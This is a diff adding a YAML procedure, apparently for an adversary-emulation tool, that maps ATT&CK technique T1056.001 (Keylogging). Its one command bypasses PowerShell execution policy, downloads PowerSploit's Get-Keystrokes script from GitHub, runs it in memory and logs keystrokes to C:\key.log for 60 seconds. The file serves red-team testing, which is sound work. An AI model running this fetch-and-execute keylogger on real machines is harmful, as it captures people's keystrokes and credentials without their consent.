@@ -1,0 +1,21 @@
+id: b1846e2d-197f-4828-8514-c6c52f870d1a
+name: PowerSploit Get-Keystrokes
+description: >-
+  This procedure will capture keys pressed, time and active window for 60
+  seconds and log the collected keystrokes in the C:\ directory.
+tactic: credential-access
+technique:
+  id: T1056.001
+  name: Keylogging
+platforms:
+  windows:
+    pwsh:
+      command: >-
+        powershell.exe -exec bypass -C "IEX (New-Object
+        Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1');
+        Get-Keystrokes -LogPath C:\key.log -Timeout 60"
+metadata:
+  authors:
+    - bfuzzy1
+  tags: []
+  version: 1
